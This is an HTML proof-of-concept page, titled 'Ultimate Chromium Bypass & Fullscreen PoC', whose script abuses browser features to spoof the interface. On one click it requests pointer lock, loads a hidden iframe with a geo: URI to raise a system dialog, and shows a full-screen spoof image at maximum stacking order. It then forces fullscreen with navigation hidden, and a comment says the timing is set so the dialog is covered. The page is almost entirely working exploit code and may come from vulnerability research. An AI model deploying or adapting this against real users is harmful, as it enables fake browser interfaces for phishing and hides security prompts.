<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Ultimate Chromium Bypass & Fullscreen PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      #fullscreenElement {
        position: relative;
        width: 100%;
        height: 100%;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
      #spoof {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        min-width: 100vw;
        min-height: 100vh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
      }
      #pointerLockElement {
        width: 1px;
        height: 1px;
        position: absolute;
        opacity: 0;
      }
    </style>
    <script>
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };
      
      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE DEEP BYPASS & OVERLAY</button>
        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Executing security context bypass sequence...";
        this.style.display = "none";

        try {
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            try {
              await plElement.requestPointerLock();
            } catch (err) {
              console.debug("PointerLock restriction handled:", err.message);
            }
          }

          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "geo:0,0?q=apple.com";
          document.body.appendChild(spoofFrame);

          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          // Dipercepat menjadi 1 detik agar transisi fullscreen langsung menutupi konteks dialog secepat mungkin
          setTimeout(() => {
            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
            
            let requestFS = fsElement.requestFullscreen || 
                            fsElement.webkitRequestFullscreen || 
                            fsElement.mozRequestFullScreen || 
                            fsElement.msRequestFullscreen;

            if (requestFS) {
              requestFS.call(fsElement, { navigationUI: "hide" }).catch((err) => {
                try {
                  requestFS.call(fsElement);
                } catch (e) {
                  console.debug("Fullscreen fallback active:", e.message);
                }
              });
            }

            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }
            
            statusInfo.innerText = "Status: Fullscreen security bypass active & locked.";
          }, 1000);

        } catch (err) {
          statusInfo.innerText = "Status: Critical execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
